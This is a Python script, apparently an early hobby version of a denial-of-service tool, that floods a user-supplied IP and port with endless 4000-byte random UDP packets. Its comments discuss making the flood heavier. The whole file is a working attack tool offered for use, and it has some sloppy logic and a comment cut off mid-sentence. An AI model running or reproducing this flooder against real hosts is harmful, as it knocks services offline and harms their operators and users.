import sys, socket
import random
from datetime import datetime as dt

# ANSI colors with proper escape
R = "\033[31m"
G = "\033[32m"
C = "\033[36m"
W = "\033[0m"


# v1: just create ddos script

# Instead of using SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being hit

# Is there enough precedent with ipv6 addresses to use socket.AF_INET6?
# How would that work?


# this is better system = getattr(platform.uname(), "system")
# instead of hardcoding a specific index
# because if something in the l


def ddos(target, port):
    sent = 0
    # Convert port from string to integer
    port = int(port)
    
    if len(sys.argv) != 3:
        print("\n" + R + "[!]" + R + "Invalid amount of arguments")
        print("\n" + "Syntax: python3 ddos.py <ip> <port>")
    else:
        print("-" * 25)
        print(f"Attacking target: {target} on port {port}")
        print("Time started: " + str(dt.now()))
        try:
            socket.gethostbyname(target)
        except socket.gaierror:
            print(R + "[-] " + C + "Unknown address.")
            print(R + "[-] " + C + "Please input the correct ip address.")
            sys.exit()

    try:
        # create an infinite loop to continuously send junk data
        # to target ip
        while True:
            # Create a new socket
            # assign socket to s
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set the timeout for 1 second
            s.settimeout(1)
            
            try:
                # Connect to target and port
                s.connect((target, port))
                
                # create a variable that will send 4000 random bytes
                # 4000 bytes is not enough to DDoS a target.
                # Will need to test with more.
                bytes1 = random.randbytes(4000)
                
                # send 4000 random bytes to the target on port passed as arg
                s.sendto(bytes1, (target, port))
                sent += 1
                print(f"Sent {sent} packets to {target}:{port}")
                
                # Close the socket after sending
                s.close()
            except socket.error as e:
                print(R + "[-] " + C + f"Socket error: {e}")
                # Close the socket if there's an error
                s.close()
                continue
                
    except KeyboardInterrupt:
        print("\n" + R + "[!]" + C + "Terminating Session..." + W)
        sys.exit()
    
    except socket.gaierror:
        print(R + "[-] " + C + "Unknown address.")
        print(R + "[-] " + C + "Please input the correct ip address.")
        sys.exit()
    
    except socket.error:
        print(R + "[-] " + C + "Couldn't connect to server.")
        sys.exit()

if __name__ == "__main__":
    ddos(sys.argv[1], sys.argv[2])
